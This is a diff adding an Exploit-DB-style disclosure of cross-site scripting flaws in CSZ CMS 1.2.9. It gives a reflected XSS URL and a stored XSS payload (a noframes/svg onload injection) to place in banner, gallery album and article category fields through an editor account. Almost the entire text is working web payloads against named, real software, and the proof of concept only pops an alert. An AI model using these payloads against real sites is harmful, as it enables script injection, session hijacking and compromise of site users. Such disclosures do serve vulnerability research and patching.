@@ -1,0 +1,32 @@
+# Exploit Title: CSZ CMS 1.2.9 - Multiple Cross-Site Scripting
+# Date: 2020/12/28
+# Exploit Author: SunCSR
+# Vendor Homepage: https://www.cszcms.com/
+# Software Link: https://github.com/cskaza/cszcms
+# Version: 1.2.9
+# Tested on: CSZ CMS 1.2.9
+
+1. Reflected XSS
+Go to url http://localhost/pluginabc%22%2Dalert%28origin%29%2D%22abc
+<http://localhost/pluginabc%22-alert%28origin%29-%22abc>
+
+2. Stored XSS
+
+Use an editor account with rights to manage banners, plugins.
+
++ Banner Manager:
+    - Add or edit banner:
+    Name field: <noframes><p title="</noframes><svg/onload=alert(origin)>">
+    Note field: <noframes><p title="</noframes><svg/onload=alert(origin)>">
+
++ Plugin Manager:
+    - Add or edit album(/admin/plugin/gallery):
+    Album Name field: <noframes><p
+title="</noframes><svg/onload=alert(origin)>">
+    Keyword field: <noframes><p title="</noframes><svg/onload=alert(origin)>">
+    Short Description field: <noframes><p
+title="</noframes><svg/onload=alert(origin)>">
+
+    - Add or edit Category(/admin/plugin/article/):
+    Category Name field: <noframes><p
+title="</noframes><svg/onload=alert(origin)>">
